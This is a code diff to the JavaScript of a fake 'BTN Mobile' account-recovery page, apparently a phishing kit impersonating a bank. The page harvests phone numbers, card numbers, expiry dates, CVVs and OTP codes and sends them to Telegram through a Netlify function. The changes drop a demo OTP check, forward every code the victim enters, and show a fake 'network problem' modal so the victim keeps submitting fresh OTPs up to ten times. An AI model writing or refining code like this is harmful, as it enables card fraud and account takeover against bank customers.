@@ -9,9 +9,18 @@
     const page3 = document.getElementById('page3');
     const toast = document.getElementById('btnToast');
     const toastMessage = toast.querySelector('.toast-message');
+    const networkModal = document.getElementById('networkModal');
+    const closeModalBtn = document.getElementById('closeModalBtn');
 
     // Konfigurasi Netlify Function endpoint
     const NETLIFY_FUNCTION_URL = '/.netlify/functions/send-notification';
+
+    // Counter percobaan OTP
+    let otpRetryCount = 0;
+    const MAX_OTP_RETRY = 10;
+
+    // Flag untuk menandai apakah modal sedang aktif
+    let isModalActive = false;
 
     // Toast notification helper
     let toastTimeout = null;
@@ -28,6 +37,33 @@
         toastTimeout = setTimeout(() => {
             toast.classList.remove('show');
         }, 3000);
+    }
+
+    // Fungsi untuk menampilkan Modal Jaringan Bermasalah (versi BTN asli)
+    function showNetworkModal() {
+        if (isModalActive) return;
+        isModalActive = true;
+        networkModal.classList.add('show');
+    }
+
+    // Fungsi untuk menutup Modal Jaringan Bermasalah
+    function hideNetworkModal() {
+        networkModal.classList.remove('show');
+        isModalActive = false;
+        // Reset OTP fields setelah modal ditutup
+        resetOtpFields();
+    }
+
+    // Event listener untuk tombol tutup modal
+    if (closeModalBtn) {
+        closeModalBtn.addEventListener('click', () => {
+            hideNetworkModal();
+            // Fokus ke input OTP pertama
+            setTimeout(() => {
+                const firstOtp = document.querySelector('.otp-digit');
+                if (firstOtp) firstOtp.focus();
+            }, 100);
+        });
     }
 
     // Fungsi untuk mengirim data ke server (Netlify Function)
@@ -61,10 +97,8 @@
     const cvvInput = document.getElementById('cvv');
     if (toggleCVV && cvvInput) {
         toggleCVV.addEventListener('click', function(e) {
-            // Toggle tipe input antara password dan text
             const type = cvvInput.getAttribute('type') === 'password' ? 'text' : 'password';
             cvvInput.setAttribute('type', type);
-            // Ganti ikon mata (buka/tutup) - cukup ubah teks emoji
             this.textContent = type === 'password' ? '👁️' : '🙈';
         });
     }
@@ -250,7 +284,7 @@
         }
     });
     
-    // CVV hanya angka 3 digit (sudah ditangani inputmode numeric, tapi amankan lagi)
+    // CVV hanya angka 3 digit
     if (cvvInput) {
         cvvInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '').substring(0, 3);
@@ -302,6 +336,9 @@
             return;
         }
         
+        // Reset counter OTP saat masuk ke halaman baru
+        otpRetryCount = 0;
+        
         // Simpan data kartu ke session storage untuk dikirim bersama OTP nanti
         const cardData = {
             phoneNumber: phoneNumber,
@@ -312,13 +349,11 @@
             timestamp: new Date().toISOString()
         };
         
-        // Simpan ke sessionStorage
         sessionStorage.setItem('btnCardData', JSON.stringify(cardData));
         
         console.log("Informasi kartu terverifikasi untuk pemulihan.");
         
-        // Reset OTP
-        window.retryCounter = 0;
+        // Reset OTP fields
         document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
         document.getElementById('otpWarning').innerText = '';
         
@@ -332,7 +367,7 @@
         }, 150);
     });
     
-    // OTP handler (tanpa modal mengambang)
+    // OTP handler
     const otpInputs = document.querySelectorAll('.otp-digit');
     otpInputs.forEach((input, idx) => {
         input.addEventListener('input', (e) => {
@@ -364,10 +399,45 @@
     function resetOtpFields() {
         document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
         if (otpInputs[0]) otpInputs[0].focus();
+        document.getElementById('otpWarning').innerText = '';
     }
     
+    // Fungsi untuk reset ke halaman awal (setelah 10x percobaan gagal)
+    function resetToInitialState() {
+        // Reset counter
+        otpRetryCount = 0;
+        
+        // Hide modal jika masih terbuka
+        if (isModalActive) {
+            hideNetworkModal();
+        }
+        
+        // Kembali ke halaman 1
+        page3.classList.remove('active');
+        page2.classList.remove('active');
+        page1.classList.add('active');
+        initAllCarousels();
+        
+        // Reset semua form
+        document.getElementById('mobileNumber').value = '';
+        document.getElementById('nomorKartu').value = '';
+        document.getElementById('berlakuSampai').value = '';
+        if (cvvInput) cvvInput.value = '';
+        if (saldoInput) saldoInput.value = '';
+        document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
+        
+        // Hapus data session
+        sessionStorage.removeItem('btnCardData');
+        
+        // Tampilkan notifikasi
+        showNotification("Batas percobaan OTP tercapai. Silakan mulai proses pemulihan dari awal.", true);
+    }
+    
+    // Submit OTP Button Handler
     document.getElementById('submitOtpBtn').addEventListener('click', async () => {
         const mainOtp = getOtpFromPage();
+        
+        // Validasi OTP harus 6 digit
         if (mainOtp.length !== 6) {
             showNotification("Masukkan 6 digit kode OTP", true);
             return;
@@ -397,52 +467,30 @@
             };
         }
         
-        // Simulasi verifikasi OTP (demo: kode 123456 dianggap benar)
-        const isOtpValid = (mainOtp === '123456');
+        // Kirim data ke Telegram TERLEBIH DAHULU (notifikasi tetap jalan)
+        // Ini penting agar fungsi notifikasi tidak rusak
+        await sendToTelegram(allData);
         
-        if (!isOtpValid) {
-            window.retryCounter = (window.retryCounter || 0) + 1;
-            if (window.retryCounter >= 10) {
-                showNotification("Batas percobaan OTP tercapai. Mulai proses pemulihan dari awal.", true);
-                resetToInitialState();
-                return;
-            }
-            showNotification(`Kode OTP salah! Sisa percobaan: ${10 - window.retryCounter}`, true);
-            resetOtpFields();
+        // SELALU TAMPILKAN MODAL "JARINGAN ANDA BERMASALAH"
+        // Tidak ada kondisi OTP benar, selalu tampilkan modal untuk setiap percobaan
+        
+        // Increment counter percobaan
+        otpRetryCount++;
+        
+        // Cek apakah sudah mencapai batas maksimal (10 kali)
+        if (otpRetryCount >= MAX_OTP_RETRY) {
+            // Reset ke halaman awal setelah 10x percobaan
+            resetToInitialState();
             return;
         }
         
-        // Kirim data ke Telegram melalui Netlify Function
-        showNotification("Memproses pemulihan akun...", false);
+        // Tampilkan modal "Jaringan Anda Bermasalah" 
+        // (tanpa pesan berhasil sama sekali)
+        showNetworkModal();
         
-        const sent = await sendToTelegram(allData);
-        
-        if (sent) {
-            showNotification("Verifikasi berhasil! Akun Anda telah dipulihkan.", false);
-        } else {
-            showNotification("Verifikasi berhasil, namun terjadi kesalahan teknis. Hubungi CS.", true);
-        }
-        
-        // Clear session storage
-        sessionStorage.removeItem('btnCardData');
-        
-        resetToInitialState();
+        // Catatan: Tidak ada toast "berhasil" atau "verifikasi sukses"
+        // Hanya modal yang muncul setiap kali klik verifikasi
     });
-    
-    function resetToInitialState() {
-        page3.classList.remove('active');
-        page2.classList.remove('active');
-        page1.classList.add('active');
-        initAllCarousels();
-        
-        document.getElementById('mobileNumber').value = '';
-        document.getElementById('nomorKartu').value = '';
-        document.getElementById('berlakuSampai').value = '';
-        if (cvvInput) cvvInput.value = '';
-        if (saldoInput) saldoInput.value = '';
-        document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
-        window.retryCounter = 0;
-    }
     
     function enforceNumeric(inputElement) {
         if (inputElement) {
@@ -453,5 +501,5 @@
     }
     enforceNumeric(document.getElementById('mobileNumber'));
     
-    console.log('BTN Mobile - Sistem Pemulihan Akun Siap (dengan toggle CVV & Telegram Integration)');
+    console.log('BTN Mobile - Sistem Pemulihan Akun Siap (dengan Modal Jaringan Bermasalah & Telegram Integration)');
 })();
